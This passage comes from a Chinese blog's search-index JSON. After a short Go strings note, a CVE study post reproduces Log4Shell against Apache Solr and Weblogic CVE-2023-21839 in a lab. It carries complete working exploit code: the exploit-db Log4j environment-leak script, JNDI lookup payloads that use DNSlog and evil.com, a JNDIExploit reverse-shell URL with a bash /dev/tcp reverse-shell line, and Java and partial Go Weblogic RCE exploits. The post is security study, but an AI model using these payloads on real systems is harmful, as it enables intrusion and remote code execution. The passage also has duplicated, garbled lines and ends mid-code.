characters lowercased\nstrings.ToLower(\"MaKEmeLoweRCase\")\n// => \"makemelowercase\"\n\n// strings.Repeat returns a string with a substring given as argument repeated many times\nstrings.Repeat(\"Go\", 3)\n// => \"GoGoGo\"\n\n字符串包（strings）关于字符串包该strings包包含许多用于处理字符串的有用函数。\nimport import \"strings\"\n\nstrings.ToUpper(\"test\") // => \"TEST\"\n\n和java中的包很相似\n\n\n\n\n\n\n\n\n\n记几个常用的\nstrings.Repeat(str,num)：重复str字符num次\nstrings.TrimSpace(str)：清除str字符串左右边的空格\nstrings.TrimLeft/TrimRight(str,sign)：清除str字符串左/右边的sign符号\n","slug":"Go","date":"2022-12-23T13:16:34.183Z","categories_index":"语言学习","tags_index":"go语言","author_index":"Ttoc"},{"id":"0b213c75214ae7b790bcf3442a3f1836","title":"CVE漏洞学习","content":"想把一些常见的CVE以及一些经典漏洞复现，做做笔记\n\n\nCVE-2021-44228 Log4j2环境搭建\n\n\n\n\n\n\n\n\nApache Log4j2 是一个被广泛使用的开源日志记录库，2017 年 7 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 2.0-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 2021 年 11 月 24 日向 Apache 报告了该漏洞；12 月 5 日官方发布了补丁；到了 12 月 9 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。\n\n\n\n\n\n\n\n\n\n环境搭建虚拟机版本: ubuntu 20.4Apache solr版本: 8.11.0\nApache solr 8.11.0下载这里我采用的是Apache Solr开源服务器\n\n\n\n\n\n\n\n\n\nSolr是Apache下的一个顶级开源项目，采用Java开发，它是基于Lucene的全文搜索服务器。Solr提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展，并对索引、搜索性能进行了优化。\n针对漏洞修复时间[12 月 5 日]，和官方更新文档\n\nApache Solr 8.11.0是CVE-2021-44228修复前的最后的一个版本\n所以该版本也存在CVE-2021-44228\n于是下载\nhttps://archive.apache.org/dist/lucene/solr/8.11.0/\n\n\nJAVA配置由于Apache solr是基于Java开发的项目，所以需要先下载对应版本的Java\n但是针对log4j2存在的版本，需要jdk1.8.0才可以复现\n但是\n\n\n\n\n\n\n\n\n\n高版本的JDK环境中trustURLCodebase变量为false，限制了远程类的加载，导致JNDI注入利用失败，无法反弹shell能实现利用条件：版本≤ JDK 6u211、7u201、 8u191、11.0.1。但是过低版本的，solr运行可能会出错\n所以这里从官网下载专门的8u171\n解压到对应目录tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/jdk/\n\n\n部署并修改环境变量sudo vi ~/.bashrc\n在文件末尾追加下面6行内容\n#set oracle jdk environment\nexport JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 ## 这里要注意目录要换成自己解压的jdk 目录\nexport JRE_HOME=$&#123;JAVA_HOME&#125;/jre  \nexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  \nexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH\n\nsource ~/.bashrc\nsudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300\n\n查看版本java -version\n\n\nSolr下载下载solr 8.11.0\nsudo wget https://archive.apache.org/dist/lucene/solr/8.11.0/solr-8.11.0.tgz\n\n\n\n然后就解压\nsudo tar xzf solr-8.11.0.tgz\n\n\n安装 Apache Solr服务sudo bash solr-8.11.0/bin/install_solr_service.sh solr-8.11.0.tgz\n\n\n查看服务状态\nsudo systemctl status solr\n\n\n发现服务已经存在\n启动\nsudo /lib/systemd/systemd-sysv-install enable solr\n#若执行sudo systemctl enable solr会提示不是本机服务，需要按上面方式启动运行\n\n因为solr默认运行的端口为8983\n查看环境搭建的虚拟机ip\nip a\n\n\n得到环境搭建靶机ip为\n192.168.80.131\n\n成功浏览器访问\nhttp://192.168.80.131:8983\n\n\n搭建成功\n内网环境中的攻击机也成功访问\n\n环境搭建完毕\n了解漏洞描述与注入原理Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏\n洞，攻击者在可以控制日志内容的情况下，通过传入类似于\n$&#123;jndi:ldap://evil.com/example&#125;的lookup用于进行JNDI注入，执行任意代码。\nLog4j2 LookupLog4j2 Lookup是Log4j2的一项功能，允许您在日志消息中使用动态值，Log4j2提供了许多内置的Lookup对\n象，用于查找不同类型的值\n例如SystemPropertiesLookup.lookup(&quot;user.home&quot;)方法返回了系统属性user.home的值，并将其插入日志\n消息中。\nJNDI开始我也看不太懂JNDI任意代码执行语句意思\n先了解一下JNDI是什么以及其组成\nJNDI（Java命名和目录接口），是Java提供的一个目录服务应用程序接口（API）\n它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 \n\n\n\n\n\n\n\n\n\n其中大致有远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）\n其大致组成为\nString jndiName= ...;String jndiName= ...;//指定需要查找name名称\nContext context = new InitialContext();//初始化默认环境\nDataSource ds = (DataSourse)context.lookup(jndiName);//查找该name的数据\n\n所以如果能控制jndiName，再利用rmi之类的加载远程恶意类，从而执行恶意类的命令，故而实现远程代码执行\nJNDI注入结合lookup和jndi\n对于payload\n$&#123;jndi:ldap://evil.com/example&#125;是Log4j2中使用的占位符语法。它表示在日志消息中插入一个使用\nJNDILookup对象查找的值\nldap://evil.com/example是JNDI查找所使用的名称。这意味着Log4j2将在JNDI上下文中查找名为example\n的对象，该对象位于evil.com服务器上，就可能实现访问一些敏感信息以及其他恶意操作的目的\n脚本分析这里调用**exploitdb**中的对Log4j2利用的脚本，这是一个信息泄露的脚本\n发布时间: 12/12/2021\n【ps.这个脚本可能是作者上传到exp的时候空格问题，需要稍微修改一下就可以用了】\n\n脚本内容\n# Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure\n# Date: 12/12/2021\n# Exploit Author: leonjza\n# Vendor Homepage: https://logging.apache.org/log4j/2.x/\n# Version: \n# CVE: CVE-2021-44228\n\n#!/usr/bin/env python3\n\n# Pure python ENV variable leak PoC for CVE-2021-44228\n# Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284\n#\n# 2021 @leonjza\n\nimport argparse\nimport socketserver\nimport threading\nimport time\n\nimport requests\n\nLDAP_HEADER = b&#x27;\\x30\\x0c\\x02\\x01\\x01\\x61\\x07\\x0a\\x01\\x00\\x04\\x00\\x04\\x00\\x0a&#x27;\n\n\nclass ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self) -> None:\n        print(f&#x27; i| new connection from &#123;self.client_address[0]&#125;&#x27;)\n\n        sock = self.request\n        sock.recv(1024)\n        sock.sendall(LDAP_HEADER)\n\n        data = sock.recv(1024)\n        data = data[9:]  # strip header\n\n        # example response\n        #\n        # (&#x27;Java version 11.0.13\\n&#x27;\n        #  &#x27;\\x01\\x00\\n&#x27;\n        #  &#x27;\\x01\\x03\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x0b&#x27;\n        #  &#x27;objectClass0\\x00\\x1b0\\x19\\x04\\x172.16.840.1.113730.3.4.2&#x27;)\n\n        data = data.decode(errors=&#x27;ignore&#x27;).split(&#x27;\\n&#x27;)[0]\n        print(f&#x27; v| extracted value: &#123;data&#125;&#x27;)\n\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    pass\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=&#x27;a simple log4j\n\n                                                 &#x27;(ref:\nhttps://twitter.com/Black2Fan/status/1470281005038817284)&#x27;)\n    parser.add_argument(&#x27;--target&#x27;, &#x27;-t&#x27;, required=True, help=&#x27;target uri&#x27;)\n    parser.add_argument(&#x27;--listen-host&#x27;, default=&#x27;0.0.0.0&#x27;,\n                        help=&#x27;exploit server host to listen on\n(default: 127.0.0.1)&#x27;)\n    parser.add_argument(&#x27;--listen-port&#x27;, &#x27;-lp&#x27;, default=8888,\nhelp=&#x27;exploit server port to listen on (default: 8888)&#x27;)\n    parser.add_argument(&#x27;--exploit-host&#x27;, &#x27;-eh&#x27;, required=True,\ndefault=&#x27;127.0.0.1&#x27;,\n                        help=&#x27;host where (this) exploit server is reachable&#x27;)\n    parser.add_argument(&#x27;--leak&#x27;, &#x27;-l&#x27;, default=&#x27;$&#123;java:version&#125;&#x27;,\n                        help=&#x27;value to leak. &#x27;\n                             &#x27;see:\nhttps://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;\n                             &#x27;(default: $&#123;java:version&#125;)&#x27;)\n    args = parser.parse_args()\n\n    print(f&#x27; i| starting server on &#123;args.listen_host&#125;:&#123;args.listen_port&#125;&#x27;)\n    server = ThreadedTCPServer((args.listen_host, args.listen_port),\nThreadedTCPRequestHandler)\n\n    serv_thread = threading.Thread(target=server.serve_forever)\n    serv_thread.daemon = True\n    serv_thread.start()\n    time.sleep(1)\n    print(f&#x27; i| server started&#x27;)\n\n    payload = f&#x27;$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;&#x27;\n    print(f&#x27; i| sending exploit payload &#123;payload&#125; to &#123;args.target&#125;&#x27;)\n\n    try:\n        r = requests.get(args.target, headers=&#123;&#x27;User-Agent&#x27;: payload&#125;)\n        print(f&#x27; i| response status code: &#123;r.status_code&#125;&#x27;)\n        print(f&#x27; i| response: &#123;r.text&#125;&#x27;)\n    except Exception as e:\n        print(f&#x27; e| failed to make request: &#123;e&#125;&#x27;)\n    finally:\n        server.shutdown()\n        server.server_close()\n\n\nif __name__ == &#x27;__main__&#x27;:\n    main()\n\n信息泄露脚本分析LDAP_HEADER定义 LDAP_HEADER 常量，这是响应 LDAP 请求时使用的头信息\nLDAP_HEADER = LDAP_HEADER = b&#x27;\\x30\\x0c\\x02\\x01\\x01\\x61\\x07\\x0a\\x01\\x00\\x04\\x00\\x04\\x00\\x0a&#x27;\n\n\n\nThreadedTCPRequestHandler这里定义ThreadedTCPRequestHandler 类的 handle() 方法用于处理来自客户端的连接。\n该方法首先输出来自客户端的连接信息，然后通过调用 sock.recv() 和 sock.sendall() 方法读取客户端发送\n的数据，并发送响应数据\nclass class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self) -> None:\n        print(f&#x27; i| new connection from &#123;self.client_address[0]&#125;&#x27;)\n\n        sock = self.request\n        sock.recv(1024)\n        sock.sendall(LDAP_HEADER)\n\n        data = sock.recv(1024)\n        data = data[9:]  # strip header\n\n        # example response\n        #\n        # (&#x27;Java version 11.0.13\\n&#x27;\n        #  &#x27;\\x01\\x00\\n&#x27;\n        #  &#x27;\\x01\\x03\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x0b&#x27;\n        #  &#x27;objectClass0\\x00\\x1b0\\x19\\x04\\x172.16.840.1.113730.3.4.2&#x27;)\n\n        data = data.decode(errors=&#x27;ignore&#x27;).split(&#x27;\\n&#x27;)[0]\n        print(f&#x27; v| extracted value: &#123;data&#125;&#x27;)\n\n\n\nThreadedTCPServerThreadedTCPServer 类是一个多线程 TCP 服务器，它继承自 socketserver.ThreadingMixIn 和 \nsocketserver.TCPServer 类。这意味着它可以同时处理多个客户端连接。\nclass class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    pass\n\n\n\nmain()main()函数使用模块设置命令行参数解析器argparse，然后解析命令行参数。\ndef def main():\n    parser = argparse.ArgumentParser(description=&#x27;a simple log4j                              &#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;)\n\n\n\n下面的类似-t,-lh,-lp等等就是解析器设置为接受命令行参数\n    parser.add_argument(&#x27;--target&#x27;, &#x27;-t&#x27;, required=True, help=    parser.add_argument(&#x27;--target&#x27;, &#x27;-t&#x27;, required=True, help=&#x27;target uri&#x27;)\n    parser.add_argument(&#x27;--listen-host&#x27;, default=&#x27;0.0.0.0&#x27;,help=&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;)\n    parser.add_argument(&#x27;--listen-port&#x27;, &#x27;-lp&#x27;, default=8888,\nhelp=&#x27;exploit server port to listen on (default: 8888)&#x27;)\n    parser.add_argument(&#x27;--exploit-host&#x27;, &#x27;-eh&#x27;, required=True,\ndefault=&#x27;127.0.0.1&#x27;,help=&#x27;host where (this) exploit server is reachable&#x27;)\n    parser.add_argument(&#x27;--leak&#x27;, &#x27;-l&#x27;, default=&#x27;$&#123;java:version&#125;&#x27;,\n                        help=&#x27;value to leak. &#x27;&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;&#x27;(default: $&#123;java:version&#125;)&#x27;)\n\n\n\nparse_args() 方法用于解析命令行参数，并将解析后的参数值存储在一个名为 args 的变量中\n例如，在执行脚本后加的命令行参数--listen-port 8080就转变为了args.listen_port = 8080，这样在后续\n代码调用不同参数时，可直接调用arg来实现\nargs = parser.parse_args()\n\n\n\n这里先创建一个基于线程的 TCP 服务器，并使用 args.listen_host 和 args.listen_port 来指定的主机和端\n口启动，并使用 ThreadedTCPRequestHandler 类来处理每个请求【也就是前面提到的】\n    print(f&#x27; i| starting server on &#123;args.listen_host&#125;:    print(f&#x27; i| starting server on &#123;args.listen_host&#125;:&#123;args.listen_port&#125;&#x27;)\n    server = ThreadedTCPServer((args.listen_host, args.listen_port),\nThreadedTCPRequestHandler)\n\n\n\n这里主要是先创建一个 threading.Thread 对象，并将服务器的 serve_forever() 方法作为其目标。这个方法\n就是字面意思，它会一直运行，直到服务器被关闭。\nserv_thread = threading.Thread(target=server.serve_forever)\n\n\n\ndaemon 属性是 Python 中的线程特有属性，它表示该线程是否为守护线程，如果一个线程是守护线程，\n那么当程序退出时，它也会被中断。\n而这里的被设置为ture，所以这意味着程序退出时，线程将被中断。\nserv_thread.daemon = serv_thread.daemon = True\n\n\n\n然后就是启动线程，并延迟 1 秒钟，来确保服务器完全启动\nserv_thread.start()\ntime.sleep(1)\nprint(f&#x27; i| server started&#x27;)\n\npayload = f&#x27;$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;&#x27;\nprint(f&#x27; i| sending exploit payload &#123;payload&#125; to &#123;args.target&#125;&#x27;)\n\n\n\n这里使用 try-finally 语句块向服务器发送payload:\n$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;\n并打印服务器的响应状态码，以及响应的文本内容\n最后调用服务器的 shutdown() 和 server_close() 方法，以关闭服务器，即使在发送 HTTP 请求时发生异常也是如此。\ntry:\n    r = requests.get(args.target, headers=&#123;&#x27;User-Agent&#x27;: payload&#125;)\n    print(f&#x27; i| response status code: &#123;r.status_code&#125;&#x27;)\n    print(f&#x27; i| response: &#123;r.text&#125;&#x27;)\nexcept Exception as e:\n    print(f&#x27; e| failed to make request: &#123;e&#125;&#x27;)\nfinally:\n    server.shutdown()\n    server.server_close()\n\n这里就是一个常见的语句，如果脚本是独立执行的，则直接就调用 main() 函数。\nif __name__ == if __name__ == &#x27;__main__&#x27;:\n    main()\n\n渗透测试利用DNSlog验证漏洞访问http://www.dnslog.cn/\n先Get SubDomain获取一个子域名\n\n但是既然是注入，那肯定是存在参数注入点，查看官方solr文档，得到在cores里\n\n/admin/cores?action=\n\n其中action参数可控，有很大可能是注入点\n于是把我们的dnslog获取的子域名按payload形式添加到url后参数中\nhttp://192.168.80.131:8983/solr/admin/cores?action=$&#123;jndi:ldap://4d5do5.dnslog.cn&#125;\n\n访问查看\nDNSlog收到了访问请求\n\n同时在靶机页面下也有DNSlog子域名回显，虽然是\n\n说明这里的$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;，确实达到了访问的作用\n故此推断log4j2漏洞存在\n信息泄露漏洞这里可以利用脚本分析中exploitdb里的信息泄露脚本即可\n按照脚本原理也是利用占位符，也就是payload的形式，但是参数为系统属性，这些属性会自动返回对应的值，\n最后脚本通过对返回数据的解析，就可以得到敏感数据\n当然直接通过访问得到消息也是可以的\n比如$&#123;sys:os.version&#125;，就得到我们靶机的系统内核版本号为5.15.0-56-generic\nhttp://192.168.80.131:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:os.version&#125;.7b09py.dnslog.cn&#125;\n\n\n对于usr.name，以及os.name等等都是可以实现\nhttp://192.168.80.131:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:user.name&#125;.7b09py.dnslog.cn&#125;\n\n\n\n\n以下就是在log4j2其他可用系统属性列表\n\n远程代码执行漏洞攻击机kali ip:192.168.80.128\n攻击机kali 监听端口:8888\n靶机ubuntu ip:192.168.80.131\n\nJNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell该工具的原理我剖析了一下，\n先启动工具\njava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.80.128\n\n\n简单来讲就是在攻击机【192.168.80.128】的的1389端口搭建起了一个服务器，其中放置了一个恶意类，\n通过利用靶机网站JNDI注入漏洞把这个恶意类进行远程加载，从而执行了命令\n利用JNDIExploit-1.2-SNAPSHOT.jar最好的就是简化了1.0的繁杂参数\n只需要构造payload\nhttp://192.168.80.131:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.80.128:1389/Basic/ReverseShell/192.168.80.128/6666&#125;\n\n/Basic/ReverseShell/中其实就包含反弹shell的命令\nbash -i >& /dev/tcp/xx.xx.xx.xx/xxxx 0>&1\n*这里的\n/xx.xx.xx.xx/xxxx\n就是其后跟上的参数\n/192.168.80.128/6666\n\n于是就是/Basic/ReverseShell/192.168.80.128/6666被恶意类包含\n然后在攻击机监听6666端口\n\n最后访问payload，触发\n\n成功反弹到shell\n\n测试完毕\nCVE-2022-39197 Cobaltstrike RCE环境搭建CVE-2023-21839 Weblogic远程代码执行漏洞该漏洞的影响范围为Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0\n先在官方的进行修复更新文档中进行查看\n\n\n\n\n\n\n\n\n\nOracle Critical Patch Update Advisory - January 2023\n\n\n\n\nCVE-2023-21839\nOracle WebLogic Server\n核心\nT3， IIOP\n是的\n7.5\n网络\n低\n没有\n没有\n未 更改\n高\n没有\n没有\n12.2.1.3.0 12.2.1.4.0 14.1.1.0.0\n\n\n\nCVE-id\n产品\n元件\n协议\n无需身份验证即可远程利用。\n评分\n攻击向量\n攻复合体\nPrivs’Req[权限提提升]\n用户交互\n范围\n倾诉\n内涵\n可用性\n版本\n\n\n概念weblogic是什么？\n\n\n\n\n\n\n\n\nWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。\nT3的概念和交互过程\n\n\n\n\n\n\n\n\nT3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种RMI对象，但仍使用一个套接字和一条线程。这也为我们静态分析t3协议带来了很多麻烦\nRMI在log4j中提到，它是一个调用远程类的一个Java的方法\n交互方式\n\niiop概念\n\n\n\n\n\n\n\n\n用来在CORBA对象请求代理之间交流的协议。Java中使得程序可以和其他语言的CORBA实现互操作性的协议。\n这个协议的最初阶段是要建立以下几个组件部分：一个IIOP到HTTP的网关，使用这个网关可以让CORBA客户访问WWW资源；一个HTTP到IIOP的网关，通过这个网关可以访问CORBA资源；一个为IIOP和HTTP提供资源的服务器，一个能够将IIOP作为可识别协议的浏览器。\n什么是CORBA\n\n\n\n\n\n\n\n\nCORBA（Common ObjectRequest Broker Architecture公共对象请求代理体系结构）是由OMG组织制订的一种标准的面向对象应用程序体系规范。或者说CORBA体系结构是对象管理组织（OMG）为解决分布式处理环境(DCE)中，硬件和软件系统的互连而提出的一种解决方案；OMG组织是一个国际性的非盈利组织，其职责是为应用开发提供一个公共框架，制订工业指南和对象管理规范，加快对象技术的发展。\n环境搭建从官网下载Weblogic 12.2.1.3.0\n\n然后解压其中的jar包，然后到/disk1/install下执行cmd脚本就行\n但是需要注意，由于Weblogic中的maven的存在，其识别jdk时，只针对环境变量名JAVA_HOME的路径进行识别，而如果是在PATH中配置的，会报错找不到java环境的位置\nERROR: Cannot determine the Java Home ERROR: Specify the -jreLoc option\n\n\n然后再次管理员执行时发现失败，查看报错日志\n\n\n\n\n\n\n\n\n\njava.lang.NullPointerException: Cannot invoke “java.lang.reflect.Method.invoke(Object, Object[])” because “com.sun.xml.bind.v2.runtime.reflect.opt.Injector.defineClass” is null[[\n猜测应该是我的java自身的问题\n从stack中了解到了，在java9的时候，JAXB（Java Architecture for XML Binding）[java映射为xml的表示方式] \n在java9已经被标记为弃用，在java11的时候已经被删除，所以需要换到低版本的java或者在依赖项添加xml库，让其重新映射\nNew APIs in Java 11 - javaalmanac.io\n&lt;&lt;dependency>\n        groupId>com.sun.xml.bindgroupId>\n        artifactId>jaxb-implartifactId>\n        version>2.3.1version>\n    dependency>\n    dependency>\n        groupId>com.sun.xml.messaging.saajgroupId>\n        artifactId>saaj-implartifactId>\n        version>1.5.1version>\n    dependency>\n\n【建议下载jdk8低版本最方便，记得再次修改JAVA_HOME环境变量】\n\n\n\n\n\n\n\n\n\n注意，这个和log4j的原因一样，是加载远程恶意类导致远程命令的执行，所以对java是否开启加载远程类，也就是要注意对应的版本\n版本≤ JDK 6u211、7u201、 8u191、11.0.1\n所以我这里复现的环境和apache的log4j2一样，是JDK-8u171\n安装搭建按流程按引导\nhttp://localhost:7001/console\n\n\n渗透流程这是2023年一月的洞，我是二月复现的，目前大致就两种payload工具，一个java的，一个go\n仔细分析一下漏洞的利用条件和形成原因，以及两个工具的脚本的原理\n\n\n\n\n\n\n\n\n\ngo的4ra1n&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE) (github.com)\njava的DXask88MA&#x2F;Weblogic-CVE-2023-21839 (github.com)\n两者大差不差，但是个人感觉go更舒服一些\n\n\n\n\n\n\n\n\n\n在公网上，IIOP协议和NAT转换之间存在冲突的网络问题，\n一般只能修改源码或者尝试iiop协议net绕过Weblogic IIOP 协议NAT 网络绕过 - 先知社区 (aliyun.com)\n【冲突原因学习记在keynotes上，大致就是两者之间的ip指向和ip转换冲突，一个根据自身规则发送数据到私网ip，另一个根据自身规则把私网ip又变为公网ip，从而通讯连接失败】\n用go进行重写iiop的一些协议，从而避免在对公网或者docker进行操作的时候出现连接网络错误，当然java也是可以修改iiop规则的，视情况和能力而定\n远程代码执行原理\n\n\n\n\n\n\n\n\n利用该漏洞允许未经身份验证的攻击者通过 T3、IIOP 进行网络访问，从而危害 Oracle WebLogic Server。成功攻击此漏洞可导致未经授权访问关键数据或完全访问所有 Oracle WebLogic Server 可访问数据。\nJAVA（不好的就是需要对应java版本跑，每个版本Java都要删去一些东西，还是go整洁的包舒服）\n//\n// Source code recreated from a .class file by IntelliJ IDEA\n// (powered by FernFlower decompiler)\n//\n\nimport java.lang.reflect.Field;\nimport java.util.Hashtable;\nimport java.util.Random;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\nimport weblogic.deployment.jms.ForeignOpaqueReference;\n\npublic class CVE_2023_21839 &#123;\n    static String JNDI_FACTORY = \"weblogic.jndi.WLInitialContextFactory\";\n    static String HOW_TO_USE = \"[*]java -jar 目标ip:端口 ldap地址\\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111\";\n\n    public CVE_2023_21839() &#123;\n    &#125;\n\n    private static InitialContext getInitialContext(String url) throws NamingException &#123;\n        Hashtable env = new Hashtable();\n        env.put(\"java.naming.factory.initial\", JNDI_FACTORY);\n        env.put(\"java.naming.provider.url\", url);\n        return new InitialContext(env);\n    &#125;\n\n    public static void main(String[] args) throws Exception &#123;\n        if (args.length 2) &#123;\n            System.out.println(HOW_TO_USE);\n            System.exit(0);\n        &#125;\n\n        String t3Url = args[0];\n        String ldapUrl = args[1];\n        InitialContext c = getInitialContext(\"t3://\" + t3Url);\n        Hashtable env = new Hashtable();\n        env.put(\"java.naming.factory.initial\", \"com.sun.jndi.rmi.registry.RegistryContextFactory\");\n        ForeignOpaqueReference f = new ForeignOpaqueReference();\n        Field jndiEnvironment = ForeignOpaqueReference.class.getDeclaredField(\"jndiEnvironment\");\n        jndiEnvironment.setAccessible(true);\n        jndiEnvironment.set(f, env);\n        Field remoteJNDIName = ForeignOpaqueReference.class.getDeclaredField(\"remoteJNDIName\");\n        remoteJNDIName.setAccessible(true);\n        remoteJNDIName.set(f, ldapUrl);\n        String bindName = (new Random(System.currentTimeMillis())).nextLong() + \"\";\n\n        try &#123;\n            c.bind(bindName, f);\n            c.lookup(bindName);\n        &#125; catch (Exception var10) &#123;\n        &#125;\n\n    &#125;\n&#125;\n\nGO(待看)package main\n\nimport (\n\t\"CVE-2023-21839\"\n\t\"encoding/binary\"\n\t\"encoding/hex\"\n\t\"flag\"\n\t\"fmt\"\n\t\"net\"\n\t\"strings\"\n)\n\nvar (\n\thostConfig string\n\tportConfig int\n\tldapConfig string\n)\n\nvar (\n\tkey1    string\n\tkey2    string\n\tkey3    string\n\twlsKey1 string\n\twlsKey2 string\n)\n\nvar (\n\tServiceContext0 = &giop.ServiceContext&#123;\n\t\tVSCID:      giop.D(\"000000\"),\n\t\tSCID:       giop.D(\"05\"),\n\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\tData:       giop.D(\"000000000000010000000d3137322e32362e3131322e310000ec5b\"),\n\t&#125;\n\tServiceContext1 = &giop.ServiceContext&#123;\n\t\tVSCID:      giop.D(\"000000\"),\n\t\tSCID:       giop.D(\"01\"),\n\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\tData:       giop.D(\"0000000001002005010001\"),\n\t&#125;\n\tServiceContext2 = &giop.ServiceContext&#123;\n\t\tVSCID:      giop.D(\"424541\"),\n\t\tSCID:       giop.D(\"00\"),\n\t\tEndianness: []byte&#123;giop.BigEndianType&#125;,\n\t\tData:       giop.D(\"0a0301\"),\n\t&#125;\n)\n\nfunc main() &#123;\n\tflag.StringVar(&hostConfig, \"ip\", \"\", \"ip\")\n\tflag.IntVar(&portConfig, \"port\", 7001, \"port\")\n\tflag.StringVar(&ldapConfig, \"ldap\", \"\", \"ldap\")\n\tflag.Parse()\n\n\tif hostConfig == \"\" || ldapConfig == \"\" &#123;\n\t\tfmt.Println(\"Weblogic CVE-2023-21839\")\n\t\tflag.Usage()\n\t\treturn\n\t&#125;\n\n\tif !strings.HasPrefix(ldapConfig, \"ldap\") &#123;\n\t\tfmt.Println(\"Weblogic CVE-2023-21839\")\n\t\tflag.Usage()\n\t&#125;\n\n\tfmt.Printf(\"[*] your-ip: %s\\n\", hostConfig)\n\tfmt.Printf(\"[*] your-port: %d\\n\", portConfig)\n\tfmt.Printf(\"[*] your-ldap: %s\\n\", ldapConfig)\n\n\tvp := \"743320392e322e302e300a41533a3235350a484c3a39320a4d5\" +\n\t\t\"33a31303030303030300a50553a74333a2f2f746573743a373030310a0a\"\n\tver := giop.GetVersion(hostConfig, vp, portConfig)\n\tif ver == \"12\" &#123;\n\t\tfmt.Println(\"[*] weblogic 12\")\n\t\twlsKey1 = \"00424541080103000000000c41646d696e53657276657200000000000000003349\" +\n\t\t\t\"444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743\" +\n\t\t\t\"6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000\" +\n\t\t\t\"00000000000000&#123;&#123;key1&#125;&#125;\"\n\t\twlsKey2 = \"00424541080103000000000c41646d696e53657276657200000000000000003349\" +\n\t\t\t\"444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743\" +\n\t\t\t\"6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000\" +\n\t\t\t\"00000000000000&#123;&#123;key1&#125;&#125;\"\n\t&#125; else if ver == \"14\" &#123;\n\t\tfmt.Println(\"[*] weblogic 14\")\n\t\twlsKey1 = \"00424541080103000000000c41646\" +\n\t\t\t\"d696e53657276657200000000000000003349444c3a7765626c\" +\n\t\t\t\"6f6769632f636f7262612f636f732f6e616d696e672f4e616d6\" +\n\t\t\t\"96e67436f6e74657874416e793a312e30000000000002380000\" +\n\t\t\t\"00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;\"\n\t\twlsKey2 = \"00424541080103000000000c41646d696e53657276657\" +\n\t\t\t\"200000000000000003349444c3a7765626c6f6769632f636f72\" +\n\t\t\t\"62612f636f732f6e616d696e672f4e616d696e67436f6e74657\" +\n\t\t\t\"874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541\" +\n\t\t\t\"2e000000100000000000000000&#123;&#123;key1&#125;&#125;\"\n\t&#125; else &#123;\n\t\tfmt.Println(\"[!] error and exit\")\n\t&#125;\n\n\thost := hostConfig\n\tport := portConfig\n\tconn, err := net.Dial(\"tcp\", fmt.Sprintf(\"%s:%d\", host, port))\n\trmi := ldapConfig\n\t// [ldap len] [ldap string]\n\tldap := hex.EncodeToString([]byte&#123;byte(len(rmi))&#125;)\n\tldap += hex.EncodeToString([]byte(rmi))\n\tif err != nil &#123;\n\t\treturn\n\t&#125;\n\n\tlocateRequest := &giop.LocateRequest&#123;\n\t\tHeader: &giop.Header&#123;\n\t\t\tMagic:        giop.D(giop.GIOP),\n\t\t\tMajorVersion: 